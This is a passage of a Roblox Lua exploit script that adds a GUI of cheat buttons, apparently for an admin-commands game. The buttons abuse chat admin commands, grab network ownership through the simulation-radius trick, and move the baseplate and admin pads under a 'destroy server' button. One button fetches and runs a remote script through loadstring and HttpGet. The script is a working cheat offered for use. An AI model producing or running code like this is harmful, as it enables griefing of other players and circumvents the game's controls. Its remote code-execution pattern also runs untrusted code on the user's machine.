	logn("Unskydived!")
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y - 1500, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z))
end)

addButton('Discord Invite', function(self)
	say('Script Invite gg/PATnxvQ9Se')
end)

addButton('infiniteyield', function(self)
	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

addButton('Move Baseplate (up)', function(self)
	if Stable_Check == false then
		logn("{Move.lua} Moving Basteplate")
		Stable_Check = true
		if Workspace_Folder.Baseplate.CFrame.Y < 500 then
			repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
			local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
			local looping = true
			spawn(function()
				while true do
					game:GetService('RunService').Heartbeat:Wait()
					game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
					cf.CFrame = Workspace_Folder.Baseplate.CFrame * CFrame.new(-1*(Workspace_Folder.Baseplate.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
					if not looping then break end
				end
			end)
			spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
			wait(0.3)
			looping = false
			game.Players:Chat("skydive me")
			wait(0.2)
			game.Players:Chat("respawn me")
			wait(0.2)
		end
		wait(0.5)
		Stable_Check = false
		logn("{Move.lua} Done Moving Basteplate")
	else
		logn("{Move.lua} Already Moving, Please Wait")
	end
end)

addButton('toggle MyMusicOnly', function(self)
	game:GetService'Players':Chat(prefix.."toggle mymusiconly")
end)

addButton('toggle AntiKill', function(self)
	game:GetService'Players':Chat(prefix.."toggle antikill")
end)

addButton('toggle AntiJail', function(self)
	game:GetService'Players':Chat(prefix.."toggle antijail")
end)

addButton('Spin Hats', function(self)
	local plr = game.Players.LocalPlayer;
	local chr = plr.Character;
	local hum = chr.Humanoid;
	local mov = {};
	local mov2 = {};

	coroutine.resume(coroutine.create(function()
		settings().Physics.AllowSleep = false;
		game.RunService.RenderStepped:Connect(function()
			for i, v in pairs(game.Players:GetPlayers()) do
				if v ~= plr then
					v.MaximumSimulationRadius = 0.1;
					v.SimulationRadius = 0;
				else
					v.MaximumSimulationRadius = math.pow(math.huge, math.huge);
					v.SimulationRadius = math.pow(math.huge, 2);
				end
			end
		end)
	end))

	function ftp(str)
		local pt = {};
		if str ~= 'me' and str ~= 'random' then
			for i, v in pairs(game.Players:GetPlayers()) do
				if v.Name:lower():find(str:lower()) then
					table.insert(pt, v);
				end
			end
		elseif str == 'me' then
			table.insert(pt, plr);
		elseif str == 'random' then
			table.insert(pt, game.Players:GetPlayers()[math.random(1, #game.Players:GetPlayers())]);
		end
		return pt;
	end

	for _, v in pairs(hum:GetAccessories()) do
		local b = v.Handle;
		b.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0);
		b.CanCollide = false;
		b:BreakJoints();
		for _, k in pairs(v:GetChildren()) do
			if not k:IsA'SpecialMesh' and not k:IsA'Part' then
				k:Destroy();
			end
		end
		local still = Instance.new('BodyAngularVelocity', b);
		still.MaxTorque = Vector3.new(math.huge, math.huge, math.huge);
		still.AngularVelocity = Vector3.new(0, 0, 0);
		local align = Instance.new('AlignPosition', b);
		align.MaxForce = 1000000;
		align.MaxVelocity = math.huge;
		align.RigidityEnabled = false;
		align.ApplyAtCenterOfMass = true;
		align.Responsiveness = 200;
		local a0 = Instance.new('Attachment', b);
		local a1 = Instance.new('Attachment', chr.Head);
		align.Attachment0 = a0;
		align.Attachment1 = a1;
		table.insert(mov, a1);
		table.insert(mov2, still);
	end

	local par = {};
	for _, v in pairs(mov) do
		local parr = Instance.new('Part', workspace);
		parr.Anchored = true;
		parr.Size = Vector3.new(1, 1, 1);
		parr.Transparency = 1;
		parr.CanCollide = false;
		table.insert(par, parr);
	end

	local rotx = 0;
	local rotz = math.pi / 2;
	local height = 0;
	local heighti = 1;
	local offset = 10;
	local speed = 3;
	local mode = 4;
	local angular = Vector3.new(0, 0, 0);
	local l = 1;
	game['Run Service'].RenderStepped:Connect(function()
		rotx = rotx + speed / 100;
		rotz = rotz + speed / 100;
		l = (l >= 360 and 1 or l + speed);

		for i, v in pairs(par) do
			v.CFrame = CFrame.new(chr.HumanoidRootPart.Position) * CFrame.fromEulerAnglesXYZ(0, math.rad(l + (360 / #par) * i + speed), 0) * CFrame.new(offset, 0, 0);
		end

		if heighti == 1 then
			height = height + speed / 100;
		elseif heighti == 2 then
			height = height - speed / 100;
		end
		if height > 2 then
			heighti = 2;
		end
		if height < -1 then
			heighti = 1;
		end

		if mode == 1 then
			for _, v in pairs(mov) do
				v.Position = Vector3.new(math.sin(rotx) * offset, 0, math.sin(rotz) * offset);
			end
		elseif mode == 2 then
			for _, v in pairs(mov) do
				v.Position = Vector3.new(offset, height, offset);
			end
		elseif mode == 3 then
			for _, v in pairs(mov) do
				v.Position = Vector3.new(math.sin(rotx) * offset, height, math.sin(rotz) * offset);
			end
		elseif mode == 4 then
			for i, v in pairs(mov) do
				v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
			end
		elseif mode == 5 then
			for i, v in pairs(mov) do
				v.Position = Vector3.new((math.sin(rotx)) * offset, height, (math.cos(rotz) - i) * offset);
			end
		elseif mode == 6 then
			for i, v in pairs(mov) do
				v.Position = Vector3.new((math.sin(rotx)) * offset, height, (math.tan(rotz) - i) * offset);
			end
		elseif mode == 7 then
			for i, v in pairs(mov) do
				v.Position = Vector3.new(math.cos(rotx * i) * offset, 0, math.cos(rotz * i) * offset);
			end
		elseif mode == 8 then
			for i, v in pairs(mov) do
				v.Position = Vector3.new(math.sin(rotx) * i * offset, 0, math.sin(rotz) * i * offset);
			end
		elseif mode == 9 then
			pcall(function()
				local so = nil;
				for k, b in pairs(chr:GetChildren()) do
					if b:IsA'Tool' then
						for h, j in pairs(b:GetDescendants()) do
							if j:IsA'Sound' then
								so = j;
							end
						end
					end
				end
				if so ~= nil then
					offset = so.PlaybackLoudness / 35;
					speed = so.PlaybackLoudness / 500;
					angular = Vector3.new(0, so.PlaybackLoudness / 75, 0);
				end
			end)
			for i, v in pairs(mov) do
				v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
			end
		elseif mode == 10 then
			offset = height * 15;
			for i, v in pairs(mov) do
				v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
			end
		elseif mode == 11 then
			for i, v in pairs(mov) do
				v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(plr:GetMouse().Hit.p)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(plr:GetMouse().Hit.p)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(plr:GetMouse().Hit.p)).Z) + Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
			end
		end
		for _, v in pairs(mov2) do
			v.AngularVelocity = angular;
		end
	end)
end)

addGear('Jail', {
	82357101
})

addGear('Paint', {
	18474459
})

addGear('Invisible pad', {
	29099749
})

addGear('Swords', {
	69499437,
	159229806,
	108158379,
	2544549379,
	73829193,
	139577901,
	99119240,
	233520257,
	120307951
})

addGear('Vampire Vanquisher', {
	00000000000000000000000094794847
})

addGear('BoomBox', {
	000000000000000000000000212641536
})

addGear('Crossbow of the Sea', {
	000000000000000000000000236438668
})

coroutine.wrap(function()
	mods()
end)

wait(0.25)

logn("If you need help feel free to dm NoobSploit#0001 for help")


for i,v in pairs(uidata.blacklist) do
	addblBtn(i, v)
end
for i,plr in pairs(plrs:GetPlayers()) do
	scan(plr)
	addplrbtn(plr)
end
plrs.PlayerAdded:Connect(function(plr)
	scan(plr)
	addplrbtn(plr)
end)
plrs.PlayerRemoving:Connect(function(plr)
	local btn = drop:FindFirstChild(plr.Name)
	if btn then btn:Destroy() end
end)



for i,v in pairs(plrs:GetPlayers()) do
	v.Backpack.ChildAdded:Connect(function(child)
		if child:IsA('Tool') and AntiGear then
			plrs:Chat('ungear '..v.Name)
		end
	end)
	v.CharacterAdded:Connect(function()
		v.Backpack.ChildAdded:Connect(function(child)
			if child:IsA('Tool') and AntiGear then
				plrs:Chat('ungear '..v.Name)
			end
		end)
	end)
end
plrs.PlayerAdded:Connect(function(plr)
	plr.CharacterAdded:Connect(function()
		plr.Backpack.ChildAdded:Connect(function(child)
			if child:IsA('Tool') and AntiGear then
				plrs:Chat('ungear '..plr.Name)
			end
		end)
	end)
end)

addButton('antipunish', function(self)
	game.Players:Chat(prefix..'antipunish')
end)

addButton('toggle antigears on', function(self)
	AntiGear = true
	game:GetService("Players").LocalPlayer.PlayerGui.list.AntiGears.off1.BackgroundTransparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.list.AntiGears.On1.BackgroundTransparency = 0
end)

addButton('toggle antigears off', function(self)
	AntiGear = false
	game:GetService("Players").LocalPlayer.PlayerGui.list.AntiGears.On1.BackgroundTransparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.list.AntiGears.off1.BackgroundTransparency = 0
end)

local FPS1 = 0 
local FPSCOUNT
Main=Instance.new("ScreenGui",game.CoreGui)
FPS=Instance.new("TextBox",Main)
FPS.Position=UDim2.new(0.94,0,0,0)
FPS.Size=UDim2.new(0,1,0,1)
FPS.TextColor3 = Color3.new(41,255,213)
FPS.BackgroundTransparency = 1
FPS.TextXAlignment = "Left"
FPS.TextYAlignment = "Top"
FPS.TextSize = 12
FPS.Text = "0"
spawn(function() game:GetService("RunService").Heartbeat:Connect(function()
		FPS1 = FPS1+1
	end)end)
spawn(function() while wait(1) do
		FPSCOUNT = tostring(FPS1)
		FPS1 = 0 
		FPS.Text = (" FPS: " .. FPSCOUNT)
	end end)

addButton('destroy server', function(self)
	if Stable_Check == false then
		Stable_Check = true
		if Workspace_Folder.Baseplate.CFrame.Y < 500 then
			repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
			local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
			local looping = true
			spawn(function()
				while true do
					game:GetService('RunService').Heartbeat:Wait()
					game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
					cf.CFrame = Workspace_Folder.Baseplate.CFrame * CFrame.new(-1*(Workspace_Folder.Baseplate.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
					if not looping then break end
				end
			end)
			spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
			wait(0.3)
			looping = false
			game.Players:Chat("skydive me")
			wait(0.2)
			game.Players:Chat("respawn me")
			wait(0.2)
		end

		wait(0.5)
		Stable_Check = false
		if Stable_Check == false then
			Stable_Check = true
			for i, v in pairs(Admin_Folder.Pads:GetDescendants()) do
				if v.Name == "Head" then
					if v.CFrame.Y < 500 then
						repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

						local cf = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
						local looping = true

						spawn(function()
							while true do
								game:GetService('RunService').Heartbeat:Wait()
								game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
								cf.CFrame = v.CFrame * CFrame.new(-1*(v.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
								if not looping then break end
							end
						end)
						spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
						wait(0.5)
						looping = false
						game.Players:Chat("skydive me")
						wait(0.4)
						game.Players:Chat("respawn me")
						wait(0.2)
					end
				end
			end
			wait(0.5)
			Stable_Check = false
		end
	end
	game.Players:Chat("fogend 0")
	game.Players:Chat("time -")
	game.Players:Chat("flash")
end)

addButton('find resetpad (may not work)', function(self)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-7, 220009, 95))
	wait(0.1)
end)








local xsize = 1525
local ysize = 60
local textcolor = Color3.fromRGB(150, 150, 150)
local color1 = Color3.fromRGB(233, 244, 33)
local color2 = Color3.fromRGB(70, 231, 146)






local Cmdscreen = Instance.new("ScreenGui")
local CmdBarBackground = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Main = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local TextBox = Instance.new("TextBox")

--Properties:
Cmdscreen.Name = "Cmdscreen"
Cmdscreen.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Cmdscreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

CmdBarBackground.Name = "CmdBarBackground"
CmdBarBackground.Parent = Cmdscreen
CmdBarBackground.BackgroundColor3 = color1
CmdBarBackground.Position = UDim2.new(0.5, -xsize/2, 1, 0)
CmdBarBackground.Size = UDim2.new(0, xsize, 0, ysize)

UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = CmdBarBackground

Main.Name = "Main"
Main.Parent = CmdBarBackground
Main.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Main.Position = UDim2.new(0, 2, 0, 2)
Main.Size = UDim2.new(1, -4, 1, -4)

UICorner_2.CornerRadius = UDim.new(0, 5)
UICorner_2.Parent = Main

UIGradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0.00, color1),
	ColorSequenceKeypoint.new(1.00, color2)
}
UIGradient.Rotation = 90
UIGradient.Parent = Main

TextBox.Parent = Main
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1.000
TextBox.Size = UDim2.new(1, 0, 1, 0)
TextBox.Font = Enum.Font.Ubuntu
TextBox.Text = ""
TextBox.TextColor3 = textcolor
TextBox.TextScaled = true
TextBox.TextSize = 14.000
TextBox.TextWrapped = true


local colors = {
	color1,
	color2
}

local border = CmdBarBackground
local main = border.Main
local text = main.TextBox
local plrs = game:GetService('Players')
local tween = game:GetService('TweenService')
local uis = game:GetService('UserInputService')
local info = TweenInfo.new(.3, Enum.EasingStyle.Quint) --(SPEED, STYLE)
local show = tween:Create(border, info, {Position = UDim2.new(.5, -border.AbsoluteSize.X/2, 0.05, -60)})
local hide = tween:Create(border, info, {Position = UDim2.new(.5, -border.AbsoluteSize.X/2, 1, 0)})
local tweening = false
coroutine.wrap(function()
	while true do
		for i,v in pairs(colors) do
			local butt = tween:Create(border, TweenInfo.new(.8, Enum.EasingStyle.Linear), {BackgroundColor3 = v})
			butt:Play()
			butt.Completed:Wait()
		end
	end
end)()

function toggle()
	if not tweening then
		tweening = true
		if border.Position.X.Offset == 0 then
			hide:Play()
			text:ReleaseFocus()
			text.Text = ''
			hide.Completed:Wait()
		else
			show:Play()
			text:CaptureFocus()
			show.Completed:Wait()
		end
		tweening = false
	end
end

text.FocusLost:Connect(function(enterPressed)
	tweening = true
	if enterPressed then
		plrs:Chat(text.Text)
	end
	hide:Play()
	text:ReleaseFocus()
	text.Text = ''
	hide.Completed:Wait()
	tweening = false
end)
uis.InputBegan:Connect(function(input, gp)
	if not gp then
		if input.UserInputType == Enum.UserInputType.Keyboard then
			local key = input.KeyCode
			if key == Enum.KeyCode.Quote then
				game:GetService'RunService'.Heartbeat:Wait()
				toggle()
			end
		end
	end
end)
game:GetService("Players").LocalPlayer.PlayerGui.Cmdscreen.ResetOnSpawn = false
